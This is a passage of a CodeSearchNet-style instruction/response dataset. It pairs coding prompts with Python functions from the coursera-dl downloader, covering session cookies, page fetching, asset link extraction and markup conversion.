{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck whether we have all the required cookies on class. coursera. org.", "response": "def validate_cookies(session, class_name):\n    \"\"\"\n    Checks whether we have all the required cookies\n    to authenticate on class.coursera.org. Also check for and remove\n    stale session.\n    \"\"\"\n    if not do_we_have_enough_cookies(session.cookies, class_name):\n        return False\n\n    url = CLASS_URL.format(class_name=class_name) + '/class'\n    r = session.head(url, allow_redirects=False)\n\n    if r.status_code == 200:\n        return True\n    else:\n        logging.debug('Stale session.')\n        try:\n            session.cookies.clear('.coursera.org')\n        except KeyError:\n            pass\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nmaking a string of cookie keys and values.", "response": "def make_cookie_values(cj, class_name):\n    \"\"\"\n    Makes a string of cookie keys and values.\n    Can be used to set a Cookie header.\n    \"\"\"\n    path = \"/\" + class_name\n\n    cookies = [c.name + '=' + c.value\n               for c in cj\n               if c.domain == \"class.coursera.org\"\n               and c.path == path]\n\n    return '; '.join(cookies)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_cookies_for_class(cookies_file, class_name):\n\n    path = \"/\" + class_name\n\n    def cookies_filter(c):\n        return c.domain == \".coursera.org\" \\\n            or (c.domain == \"class.coursera.org\" and c.path == path)\n\n    cj = get_cookie_jar(cookies_file)\n\n    new_cj = requests.cookies.RequestsCookieJar()\n    for c in filter(cookies_filter, cj):\n        new_cj.set_cookie(c)\n\n    return new_cj", "response": "Find the cookies for the given class. coursera. org and return a RequestsCookieJar containing the cookies for the given class. coursera. org and class. coursera. org."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nload cookies file into memory.", "response": "def load_cookies_file(cookies_file):\n    \"\"\"\n    Load cookies file.\n\n    We pre-pend the file with the special Netscape header because the cookie\n    loader is very particular about this string.\n    \"\"\"\n\n    logging.debug('Loading cookie file %s into memory.', cookies_file)\n\n    cookies = StringIO()\n    cookies.write('# Netscape HTTP Cookie File')\n    cookies.write(open(cookies_file, 'rU').read())\n    cookies.flush()\n    cookies.seek(0)\n    return cookies"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_cookies_from_cache(username):\n\n    logging.debug('Trying to get cookies from the cache.')\n\n    path = get_cookies_cache_path(username)\n    cj = requests.cookies.RequestsCookieJar()\n    try:\n        cached_cj = get_cookie_jar(path)\n        for cookie in cached_cj:\n            cj.set_cookie(cookie)\n        logging.debug(\n            'Loaded cookies from %s', get_cookies_cache_path(username))\n    except IOError:\n        logging.debug('Could not load cookies from the cache.')\n\n    return cj", "response": "Returns a RequestsCookieJar containing the cached cookies for the given username."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwrites the cookies. txt file to disk in Mozilla s cookies. txt file format.", "response": "def write_cookies_to_cache(cj, username):\n    \"\"\"\n    Save RequestsCookieJar to disk in Mozilla's cookies.txt file format.\n\n    This prevents us from repeated authentications on the\n    accounts.coursera.org and class.coursera.org/class_name sites.\n    \"\"\"\n    mkdir_p(PATH_COOKIES, 0o700)\n    path = get_cookies_cache_path(username)\n    cached_cj = cookielib.MozillaCookieJar()\n    for cookie in cj:\n        cached_cj.set_cookie(cookie)\n    cached_cj.save(path)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the cookies for the given class.", "response": "def get_cookies_for_class(session, class_name,\n                          cookies_file=None,\n                          username=None,\n                          password=None):\n    \"\"\"\n    Get the cookies for the given class.\n\n    We do not validate the cookies if they are loaded from a cookies file\n    because this is intended for debugging purposes or if the coursera\n    authentication process has changed.\n    \"\"\"\n    if cookies_file:\n        cookies = find_cookies_for_class(cookies_file, class_name)\n        session.cookies.update(cookies)\n        logging.info('Loaded cookies from %s', cookies_file)\n    else:\n        cookies = get_cookies_from_cache(username)\n        session.cookies.update(cookies)\n        if validate_cookies(session, class_name):\n            logging.info('Already authenticated.')\n        else:\n            get_authentication_cookies(session, class_name, username, password)\n            write_cookies_to_cache(session.cookies, username)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndownload an HTML page using requests. Session and return the response.", "response": "def get_reply(session, url, post=False, data=None, headers=None, quiet=False):\n    \"\"\"\n    Download an HTML page using the requests session. Low-level function\n    that allows for flexible request configuration.\n\n    @param session: Requests session.\n    @type session: requests.Session\n\n    @param url: URL pattern with optional keywords to format.\n    @type url: str\n\n    @param post: Flag that indicates whether POST request should be sent.\n    @type post: bool\n\n    @param data: Payload data that is sent with request (in request body).\n    @type data: object\n\n    @param headers: Additional headers to send with request.\n    @type headers: dict\n\n    @param quiet: Flag that tells whether to print error message when status\n        code != 200.\n    @type quiet: bool\n\n    @return: Requests response.\n    @rtype: requests.Response\n    \"\"\"\n\n    request_headers = {} if headers is None else headers\n\n    request = requests.Request('POST' if post else 'GET',\n                               url,\n                               data=data,\n                               headers=request_headers)\n    prepared_request = session.prepare_request(request)\n\n    reply = session.send(prepared_request)\n\n    try:\n        reply.raise_for_status()\n    except requests.exceptions.HTTPError as e:\n        if not quiet:\n            logging.error(\"Error %s getting page %s\", e, url)\n            logging.error(\"The server replied: %s\", reply.text)\n        raise\n\n    return reply"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndownloads an HTML page using the requests library.", "response": "def get_page(session,\n             url,\n             json=False,\n             post=False,\n             data=None,\n             headers=None,\n             quiet=False,\n             **kwargs):\n    \"\"\"\n    Download an HTML page using the requests session.\n\n    @param session: Requests session.\n    @type session: requests.Session\n\n    @param url: URL pattern with optional keywords to format.\n    @type url: str\n\n    @param post: Flag that indicates whether POST request should be sent.\n    @type post: bool\n\n    @param data: Payload data that is sent with request (in request body).\n    @type data: object\n\n    @param headers: Additional headers to send with request.\n    @type headers: dict\n\n    @return: Response body.\n    @rtype: str\n    \"\"\"\n    url = url.format(**kwargs)\n    reply = get_reply(session, url, post=post, data=data, headers=headers,\n                      quiet=quiet)\n    return reply.json() if json else reply.text"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndownload an HTML page using requests session and return the final URL after following redirects.", "response": "def get_page_and_url(session, url):\n    \"\"\"\n    Download an HTML page using the requests session and return\n    the final URL after following redirects.\n    \"\"\"\n    reply = get_reply(session, url)\n    return reply.text, reply.url"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks whether a give format or url should be skipped and not downloaded.", "response": "def skip_format_url(format_, url):\n    \"\"\"\n    Checks whether a give format/url should be skipped and not downloaded.\n\n    @param format_: Filename format (extension).\n    @type format_: str (e.g. html, txt, zip, pdf)\n\n    @param url: URL.\n    @type url: str\n\n    @return: True if format/url should be skipped, False otherwise.\n    @rtype bool\n    \"\"\"\n    # Do not download empty formats\n    if format_ == '':\n        return True\n\n    # Do not download email addresses\n    if ('mailto:' in url) and ('@' in url):\n        return True\n\n    # Is this localhost?\n    parsed = urlparse(url)\n    if parsed.hostname == 'localhost':\n        return True\n\n    # These are trusted manually added formats, do not skip them\n    if RE_VALID_FORMATS.match(format_):\n        return False\n\n    # Simple formats only contain letters, numbers, \"_\" and \"-\"\n    # If this a non simple format?\n    if RE_NON_SIMPLE_FORMAT.match(format_):\n        return True\n\n    # Is this a link to the site root?\n    if parsed.path in ('', '/'):\n        return True\n\n    # Do not skip\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_resources_to_get(lecture, file_formats, resource_filter, ignored_formats=None):\n    resources_to_get = []\n\n    if ignored_formats is None:\n        ignored_formats = []\n\n    if len(ignored_formats):\n        logging.info(\"The following file formats will be ignored: \" + \",\".join(ignored_formats))\n\n    for fmt, resources in iteritems(lecture):\n        fmt0 = fmt\n\n        short_fmt = None\n        if '.' in fmt:\n            short_fmt = fmt.split('.')[1]\n\n        if fmt in ignored_formats or (short_fmt != None and short_fmt in ignored_formats) :\n            continue\n\n        if fmt in file_formats or (short_fmt != None and short_fmt in file_formats) or 'all' in file_formats:\n            for r in resources:\n                if resource_filter and r[1] and not re.search(resource_filter, r[1]):\n                    logging.debug('Skipping b/c of rf: %s %s',\n                                  resource_filter, r[1])\n                    continue\n                resources_to_get.append((fmt0, r[0], r[1]))\n        else:\n            logging.debug(\n                'Skipping b/c format %s not in %s', fmt, file_formats)\n\n    return resources_to_get", "response": "Find resources to download."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef generate_readme_rst():\n\n    pandoc_cmd = [\n        'pandoc',\n        '--from=markdown',\n        '--to=rst',\n        '--output=README.rst',\n        'README.md'\n    ]\n\n    if os.path.exists('README.rst'):\n        return\n    try:\n        subprocess.call(pandoc_cmd)\n    except (IOError, OSError) as e:\n        print('Could not run \"pandoc\". Error: %s' % e, file=sys.stderr)\n        print('Generating only a stub instead of the real documentation.')", "response": "Generate README. rst from README. md via pandoc."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreads the contents of filename or give an alternative result instead.", "response": "def read_file(filename, alt=None):\n    \"\"\"\n    Read the contents of filename or give an alternative result instead.\n    \"\"\"\n    lines = None\n\n    try:\n        with open(filename, encoding='utf-8') as f:\n            lines = f.read()\n    except IOError:\n        lines = [] if alt is None else alt\n    return lines"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef release_check():\n    tags = local(\"git tag\", capture=True)\n    tags = set(tags.splitlines())\n    if env.version in tags:\n        raise Exception(\"Already released v. %r\" % env.version)", "response": "Check if there is a Git tag already in place"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreleasing a new version", "response": "def release():\n    \"\"\"Release a new version\"\"\"\n    release_check()\n    build()\n    print(\"Releasing %s version %s.\" % (env.projname, env.version))\n    local(\"git tag %s\" % env.version)\n    local('gpg --detach-sign --armor dist/coursera-*.tar.gz*')\n    local('twine upload dist/coursera-*.tar.gz*')\n    local(\"git push\")\n    local(\"git push --tags\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nexpanding the list of class names with the child classes.", "response": "def expand_specializations(session, class_names):\n    \"\"\"\n    Checks whether any given name is not a class but a specialization.\n\n    If it's a specialization, expand the list of class names with the child\n    class names.\n    \"\"\"\n    result = []\n    for class_name in class_names:\n        specialization = SpecializationV1.create(session, class_name)\n        if specialization is None:\n            result.append(class_name)\n        else:\n            result.extend(specialization.children)\n            logging.info('Expanded specialization \"%s\" into the following'\n                         ' classes: %s',\n                         class_name, ' '.join(specialization.children))\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nperforming basic conversion of markup. This includes the basic CSS style of several textual markup tags with their HTML equivalents.", "response": "def _convert_markup_basic(self, soup):\n        \"\"\"\n        Perform basic conversion of instructions markup. This includes\n        replacement of several textual markup tags with their HTML equivalents.\n\n        @param soup: BeautifulSoup instance.\n        @type soup: BeautifulSoup\n        \"\"\"\n        # Inject meta charset tag\n        meta = soup.new_tag('meta', charset='UTF-8')\n        soup.insert(0, meta)\n\n        # 1. Inject basic CSS style\n        css = \"\".join([\n            INSTRUCTIONS_HTML_INJECTION_PRE,\n            self._mathjax_cdn_url,\n            INSTRUCTIONS_HTML_INJECTION_AFTER])\n        css_soup = BeautifulSoup(css)\n        soup.append(css_soup)\n\n        # 2. Replace <text> with <p>\n        while soup.find('text'):\n            soup.find('text').name = 'p'\n\n        # 3. Replace <heading level=\"1\"> with <h1>\n        while soup.find('heading'):\n            heading = soup.find('heading')\n            heading.name = 'h%s' % heading.attrs.get('level', '1')\n\n        # 4. Replace <code> with <pre>\n        while soup.find('code'):\n            soup.find('code').name = 'pre'\n\n        # 5. Replace <list> with <ol> or <ul>\n        while soup.find('list'):\n            list_ = soup.find('list')\n            type_ = list_.attrs.get('bullettype', 'numbers')\n            list_.name = 'ol' if type_ == 'numbers' else 'ul'"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting images of instructions markup. Images are downloaded base64 - encoded and inserted into <img > tags.", "response": "def _convert_markup_images(self, soup):\n        \"\"\"\n        Convert images of instructions markup. Images are downloaded,\n        base64-encoded and inserted into <img> tags.\n\n        @param soup: BeautifulSoup instance.\n        @type soup: BeautifulSoup\n        \"\"\"\n        # 6. Replace <img> assets with actual image contents\n        images = [image for image in soup.find_all('img')\n                  if image.attrs.get('assetid') is not None]\n        if not images:\n            return\n\n        # Get assetid attribute from all images\n        asset_ids = [image.attrs.get('assetid') for image in images]\n        self._asset_retriever(asset_ids)\n\n        for image in images:\n            # Encode each image using base64\n            asset = self._asset_retriever[image['assetid']]\n            if asset.data is not None:\n                encoded64 = base64.b64encode(asset.data).decode()\n                image['src'] = 'data:%s;base64,%s' % (\n                    asset.content_type, encoded64)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _convert_markup_audios(self, soup):\n        # 7. Replace <asset> audio assets with actual audio contents\n        audios = [audio for audio in soup.find_all('asset')\n                  if audio.attrs.get('id') is not None\n                  and audio.attrs.get('assettype') == 'audio']\n        if not audios:\n            return\n\n        # Get assetid attribute from all audios\n        asset_ids = [audio.attrs.get('id') for audio in audios]\n        self._asset_retriever(asset_ids)\n\n        for audio in audios:\n            # Encode each audio using base64\n            asset = self._asset_retriever[audio['id']]\n            if asset.data is not None:\n                encoded64 = base64.b64encode(asset.data).decode()\n                data_string = 'data:%s;base64,%s' % (\n                    asset.content_type, encoded64)\n\n                source_tag = soup.new_tag(\n                    'source', src=data_string, type=asset.content_type)\n                controls_tag = soup.new_tag('audio', controls=\"\")\n                controls_tag.string = 'Your browser does not support the audio element.'\n\n                controls_tag.append(source_tag)\n                audio.insert_after(controls_tag)", "response": "Convert audios of instructions markup. Audios are downloaded base64 - encoded and inserted as audio controls."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating an instance of OnDemandCourseMaterialItemsV1 from a session and a course_name.", "response": "def create(session, course_name):\n        \"\"\"\n        Create an instance using a session and a course_name.\n\n        @param session: Requests session.\n        @type session: requests.Session\n\n        @param course_name: Course name (slug) from course json.\n        @type course_name: str\n\n        @return: Instance of OnDemandCourseMaterialItems\n        @rtype: OnDemandCourseMaterialItems\n        \"\"\"\n\n        dom = get_page(session, OPENCOURSE_ONDEMAND_COURSE_MATERIALS,\n                       json=True,\n                       class_name=course_name)\n        return OnDemandCourseMaterialItemsV1(\n            dom['linked']['onDemandCourseMaterialItems.v1'])"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_courses(self):\n        reply = get_page(self._session, OPENCOURSE_MEMBERSHIPS, json=True)\n        course_list = reply['linked']['courses.v1']\n        slugs = [element['slug'] for element in course_list]\n        return slugs", "response": "List enrolled courses.\n\n        @return: List of enrolled courses.\n        @rtype: [str]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef extract_links_from_lecture(self, course_id,\n                                   video_id, subtitle_language='en',\n                                   resolution='540p'):\n        \"\"\"\n        Return the download URLs of on-demand course video.\n\n        @param video_id: Video ID.\n        @type video_id: str\n\n        @param subtitle_language: Subtitle language.\n        @type subtitle_language: str\n\n        @param resolution: Preferred video resolution.\n        @type resolution: str\n\n        @return: @see CourseraOnDemand._extract_links_from_text\n        \"\"\"\n        try:\n            links = self._extract_videos_and_subtitles_from_lecture(\n                course_id, video_id, subtitle_language, resolution)\n\n            assets = self._get_lecture_asset_ids(course_id, video_id)\n            assets = self._normalize_assets(assets)\n            extend_supplement_links(\n                links, self._extract_links_from_lecture_assets(assets))\n\n            return links\n        except requests.exceptions.HTTPError as exception:\n            logging.error('Could not download lecture %s: %s',\n                          video_id, exception)\n            if is_debug_run():\n                logging.exception(\n                    'Could not download lecture %s: %s', video_id, exception)\n            return None", "response": "Extract the URLs of on - demand course video from lecture."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_lecture_asset_ids(self, course_id, video_id):\n        dom = get_page(self._session, OPENCOURSE_ONDEMAND_LECTURE_ASSETS_URL,\n                       json=True, course_id=course_id, video_id=video_id)\n        # Note that we extract here \"id\", not definition -> assetId, as it\n        # be extracted later.\n        return [asset['id']\n                for asset in dom['linked']['openCourseAssets.v1']]", "response": "Obtain a list of asset ids from a lecture."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nnormalize the list of asset ids to be consistent with the openCOURSE_ASSETS_URL.", "response": "def _normalize_assets(self, assets):\n        \"\"\"\n        Perform asset normalization. For some reason, assets that are sometimes\n        present in lectures, have \"@1\" at the end of their id. Such \"uncut\"\n        asset id when fed to OPENCOURSE_ASSETS_URL results in error that says:\n        \"Routing error: 'get-all' not implemented\". To avoid that, the last\n        two characters from asset id are cut off and after that that method\n        works fine. It looks like, Web UI is doing the same.\n\n        @param assets: List of asset ids.\n        @type assets: [str]\n\n        @return: Normalized list of asset ids (without trailing \"@1\")\n        @rtype: [str]\n        \"\"\"\n        new_assets = []\n\n        for asset in assets:\n            # For example: giAxucdaEeWJTQ5WTi8YJQ@1\n            if len(asset) == 24:\n                # Turn it into: giAxucdaEeWJTQ5WTi8YJQ\n                asset = asset[:-2]\n            new_assets.append(asset)\n\n        return new_assets"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _extract_links_from_lecture_assets(self, asset_ids):\n        links = {}\n\n        def _add_asset(name, url, destination):\n            filename, extension = os.path.splitext(clean_url(name))\n            if extension is '':\n                return\n\n            extension = clean_filename(\n                extension.lower().strip('.').strip(),\n                self._unrestricted_filenames)\n            basename = clean_filename(\n                os.path.basename(filename),\n                self._unrestricted_filenames)\n            url = url.strip()\n\n            if extension not in destination:\n                destination[extension] = []\n            destination[extension].append((url, basename))\n\n        for asset_id in asset_ids:\n            for asset in self._get_asset_urls(asset_id):\n                _add_asset(asset['name'], asset['url'], links)\n\n        return links", "response": "Extract links to files of the asset ids."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting list of asset file names and urls. This method may internally be used by AssetRetriever to extract asset element types.", "response": "def _get_asset_urls(self, asset_id):\n        \"\"\"\n        Get list of asset urls and file names. This method may internally\n        use AssetRetriever to extract `asset` element types.\n\n        @param asset_id: Asset ID.\n        @type asset_id: str\n\n        @return List of dictionaries with asset file names and urls.\n        @rtype [{\n            'name': '<filename.ext>'\n            'url': '<url>'\n        }]\n        \"\"\"\n        dom = get_page(self._session, OPENCOURSE_ASSETS_URL,\n                       json=True, id=asset_id)\n        logging.debug('Parsing JSON for asset_id <%s>.', asset_id)\n\n        urls = []\n\n        for element in dom['elements']:\n            typeName = element['typeName']\n            definition = element['definition']\n\n            # Elements of `asset` types look as follows:\n            #\n            # {'elements': [{'definition': {'assetId': 'gtSfvscoEeW7RxKvROGwrw',\n            #                               'name': '\u041f\u0440\u0435\u0437\u0435\u043d\u0442\u0430\u0446\u0438\u044f \u043a \u043b\u0435\u043a\u0446\u0438\u0438'},\n            #                'id': 'phxNlMcoEeWXCQ4nGuQJXw',\n            #                'typeName': 'asset'}],\n            #  'linked': None,\n            #  'paging': None}\n            #\n            if typeName == 'asset':\n                open_course_asset_id = definition['assetId']\n                for asset in self._asset_retriever([open_course_asset_id],\n                                                   download=False):\n                    urls.append({'name': asset.name, 'url': asset.url})\n\n            # Elements of `url` types look as follows:\n            #\n            # {'elements': [{'definition': {'name': 'What motivates you.pptx',\n            #                               'url': 'https://d396qusza40orc.cloudfront.net/learning/Powerpoints/2-4A_What_motivates_you.pptx'},\n            #                'id': '0hixqpWJEeWQkg5xdHApow',\n            #                'typeName': 'url'}],\n            #  'linked': None,\n            #  'paging': None}\n            #\n            elif typeName == 'url':\n                urls.append({'name': definition['name'].strip(),\n                             'url': definition['url'].strip()})\n\n            else:\n                logging.warning(\n                    'Unknown asset typeName: %s\\ndom: %s\\n'\n                    'If you think the downloader missed some '\n                    'files, please report the issue here:\\n'\n                    'https://github.com/coursera-dl/coursera-dl/issues/new',\n                    typeName, json.dumps(dom, indent=4))\n\n        return urls"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef extract_links_from_peer_assignment(self, element_id):\n        logging.debug(\n            'Gathering supplement URLs for element_id <%s>.', element_id)\n\n        try:\n            # Assignment text (instructions) contains asset tags which describe\n            # supplementary files.\n            text = ''.join(self._extract_peer_assignment_text(element_id))\n            if not text:\n                return {}\n\n            supplement_links = self._extract_links_from_text(text)\n            instructions = (IN_MEMORY_MARKER + self._markup_to_html(text),\n                            'peer_assignment_instructions')\n            extend_supplement_links(\n                supplement_links, {IN_MEMORY_EXTENSION: [instructions]})\n            return supplement_links\n        except requests.exceptions.HTTPError as exception:\n            logging.error('Could not download peer assignment %s: %s',\n                          element_id, exception)\n            if is_debug_run():\n                logging.exception('Could not download peer assignment %s: %s',\n                                  element_id, exception)\n            return None", "response": "Extract links to supplementary files from peer assignment text."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef extract_links_from_supplement(self, element_id):\n        logging.debug(\n            'Gathering supplement URLs for element_id <%s>.', element_id)\n\n        try:\n            dom = get_page(self._session, OPENCOURSE_SUPPLEMENT_URL,\n                           json=True,\n                           course_id=self._course_id,\n                           element_id=element_id)\n\n            supplement_content = {}\n\n            # Supplement content has structure as follows:\n            # 'linked' {\n            #   'openCourseAssets.v1' [ {\n            #       'definition' {\n            #           'value'\n\n            for asset in dom['linked']['openCourseAssets.v1']:\n                value = asset['definition']['value']\n                # Supplement lecture types are known to contain both <asset> tags\n                # and <a href> tags (depending on the course), so we extract\n                # both of them.\n                extend_supplement_links(\n                    supplement_content, self._extract_links_from_text(value))\n\n                instructions = (IN_MEMORY_MARKER + self._markup_to_html(value),\n                                'instructions')\n                extend_supplement_links(\n                    supplement_content, {IN_MEMORY_EXTENSION: [instructions]})\n\n            return supplement_content\n        except requests.exceptions.HTTPError as exception:\n            logging.error('Could not download supplement %s: %s',\n                          element_id, exception)\n            if is_debug_run():\n                logging.exception('Could not download supplement %s: %s',\n                                  element_id, exception)\n            return None", "response": "Extract links from supplement page."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _extract_asset_tags(self, text):\n        soup = BeautifulSoup(text)\n        asset_tags_map = {}\n\n        for asset in soup.find_all('asset'):\n            asset_tags_map[asset['id']] = {'name': asset['name'],\n                                           'extension': asset['extension']}\n\n        return asset_tags_map", "response": "Extract asset tags from text into a convenient form."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _extract_asset_urls(self, asset_ids):\n        dom = get_page(self._session, OPENCOURSE_ASSET_URL,\n                       json=True,\n                       ids=quote_plus(','.join(asset_ids)))\n\n        return [{'id': element['id'],\n                 'url': element['url'].strip()}\n                for element in dom['elements']]", "response": "Extract asset URLs along with asset ids."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nextracts links from supplement page.", "response": "def extract_links_from_reference(self, short_id):\n        \"\"\"\n        Return a dictionary with supplement files (pdf, csv, zip, ipynb, html\n        and so on) extracted from supplement page.\n\n        @return: @see CourseraOnDemand._extract_links_from_text\n        \"\"\"\n        logging.debug('Gathering resource URLs for short_id <%s>.', short_id)\n\n        try:\n            dom = get_page(self._session, OPENCOURSE_REFERENCE_ITEM_URL,\n                           json=True,\n                           course_id=self._course_id,\n                           short_id=short_id)\n\n            resource_content = {}\n\n            # Supplement content has structure as follows:\n            # 'linked' {\n            #   'openCourseAssets.v1' [ {\n            #       'definition' {\n            #           'value'\n\n            for asset in dom['linked']['openCourseAssets.v1']:\n                value = asset['definition']['value']\n                # Supplement lecture types are known to contain both <asset> tags\n                # and <a href> tags (depending on the course), so we extract\n                # both of them.\n                extend_supplement_links(\n                    resource_content, self._extract_links_from_text(value))\n\n                instructions = (IN_MEMORY_MARKER + self._markup_to_html(value),\n                                'resources')\n                extend_supplement_links(\n                    resource_content, {IN_MEMORY_EXTENSION: [instructions]})\n\n            return resource_content\n        except requests.exceptions.HTTPError as exception:\n            logging.error('Could not download supplement %s: %s',\n                          short_id, exception)\n            if is_debug_run():\n                logging.exception('Could not download supplement %s: %s',\n                                  short_id, exception)\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nextracting assignment instructions text from an element.", "response": "def _extract_programming_immediate_instructions_text(self, element_id):\n        \"\"\"\n        Extract assignment text (instructions).\n\n        @param element_id: Element id to extract assignment instructions from.\n        @type element_id: str\n\n        @return: List of assignment text (instructions).\n        @rtype: [str]\n        \"\"\"\n        dom = get_page(self._session, OPENCOURSE_PROGRAMMING_IMMEDIATE_INSTRUCTIOINS_URL,\n                       json=True,\n                       course_id=self._course_id,\n                       element_id=element_id)\n\n        return [element['assignmentInstructions']['definition']['value']\n                for element in dom['elements']]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nextracting notebook text (instructions). @param element_id: Element id to extract notebook links. @type element_id: str @return: Notebook URL. @rtype: [str]", "response": "def _extract_notebook_text(self, element_id):\n        \"\"\"\n        Extract notebook text (instructions).\n\n        @param element_id: Element id to extract notebook links.\n        @type element_id: str\n\n        @return: Notebook URL.\n        @rtype: [str]\n        \"\"\"\n        headers = self._auth_headers_with_json()\n        data = {'courseId': self._course_id,\n                'learnerId': self._user_id, 'itemId': element_id}\n        dom = get_page(self._session, OPENCOURSE_NOTEBOOK_LAUNCHES,\n                       post=True,\n                       json=True,\n                       user_id=self._user_id,\n                       course_id=self._course_id,\n                       headers=headers,\n                       element_id=element_id,\n                       data=json.dumps(data)\n                       )\n\n        # Return authorization id. This id changes on each request\n        return dom['elements'][0]['authorizationId']"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nextracting assignment text from the submissionLearnerSchema.", "response": "def _extract_assignment_text(self, element_id):\n        \"\"\"\n        Extract assignment text (instructions).\n\n        @param element_id: Element id to extract assignment instructions from.\n        @type element_id: str\n\n        @return: List of assignment text (instructions).\n        @rtype: [str]\n        \"\"\"\n        dom = get_page(self._session, OPENCOURSE_PROGRAMMING_ASSIGNMENTS_URL,\n                       json=True,\n                       course_id=self._course_id,\n                       element_id=element_id)\n\n        return [element['submissionLearnerSchema']['definition']\n                ['assignmentInstructions']['definition']['value']\n                for element in dom['elements']]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nextracts peer assignment text from an element.", "response": "def _extract_peer_assignment_text(self, element_id):\n        \"\"\"\n        Extract peer assignment text (instructions).\n\n        @param element_id: Element id to extract peer assignment instructions from.\n        @type element_id: str\n\n        @return: List of peer assignment text (instructions).\n        @rtype: [str]\n        \"\"\"\n        dom = get_page(self._session, OPENCOURSE_PEER_ASSIGNMENT_INSTRUCTIONS,\n                       json=True,\n                       user_id=self._user_id,\n                       course_id=self._course_id,\n                       element_id=element_id)\n\n        result = []\n\n        for element in dom['elements']:\n            # There is only one section with Instructions\n            if 'introduction' in element['instructions']:\n                result.append(element['instructions']\n                              ['introduction']['definition']['value'])\n\n            # But there may be multiple sections in Sections\n            for section in element['instructions'].get('sections', []):\n                section_value = section['content']['definition']['value']\n                section_title = section.get('title')\n                if section_title is not None:\n                    # If section title is present, put it in the beginning of\n                    # section value as if it was there.\n                    section_value = ('<heading level=\"3\">%s</heading>' %\n                                     section_title) + section_value\n                result.append(section_value)\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _extract_links_from_text(self, text):\n        supplement_links = self._extract_links_from_a_tags_in_text(text)\n\n        extend_supplement_links(\n            supplement_links,\n            self._extract_links_from_asset_tags_in_text(text))\n\n        return supplement_links", "response": "Extract supplement links from the html text."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nscans the text and extract asset tags and links to corresponding asset files.", "response": "def _extract_links_from_asset_tags_in_text(self, text):\n        \"\"\"\n        Scan the text and extract asset tags and links to corresponding\n        files.\n\n        @param text: Page text.\n        @type text: str\n\n        @return: @see CourseraOnDemand._extract_links_from_text\n        \"\"\"\n        # Extract asset tags from instructions text\n        asset_tags_map = self._extract_asset_tags(text)\n        ids = list(iterkeys(asset_tags_map))\n        if not ids:\n            return {}\n\n        # asset tags contain asset names and ids. We need to make another\n        # HTTP request to get asset URL.\n        asset_urls = self._extract_asset_urls(ids)\n\n        supplement_links = {}\n\n        # Build supplement links, providing nice titles along the way\n        for asset in asset_urls:\n            title = clean_filename(\n                asset_tags_map[asset['id']]['name'],\n                self._unrestricted_filenames)\n            extension = clean_filename(\n                asset_tags_map[asset['id']]['extension'].strip(),\n                self._unrestricted_filenames)\n            url = asset['url'].strip()\n            if extension not in supplement_links:\n                supplement_links[extension] = []\n            supplement_links[extension].append((url, title))\n\n        return supplement_links"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _extract_links_from_a_tags_in_text(self, text):\n        soup = BeautifulSoup(text)\n        links = [item['href'].strip()\n                 for item in soup.find_all('a') if 'href' in item.attrs]\n        links = sorted(list(set(links)))\n        supplement_links = {}\n\n        for link in links:\n            filename, extension = os.path.splitext(clean_url(link))\n            # Some courses put links to sites in supplement section, e.g.:\n            # http://pandas.pydata.org/\n            if extension is '':\n                continue\n\n            # Make lowercase and cut the leading/trailing dot\n            extension = clean_filename(\n                extension.lower().strip('.').strip(),\n                self._unrestricted_filenames)\n            basename = clean_filename(\n                os.path.basename(filename),\n                self._unrestricted_filenames)\n            if extension not in supplement_links:\n                supplement_links[extension] = []\n            # Putting basename into the second slot of the tuple is important\n            # because that will allow to download many supplements within a\n            # single lecture, e.g.:\n            # 01_slides-presented-in-this-module.pdf\n            # 01_slides-presented-in-this-module_Dalal-cvpr05.pdf\n            # 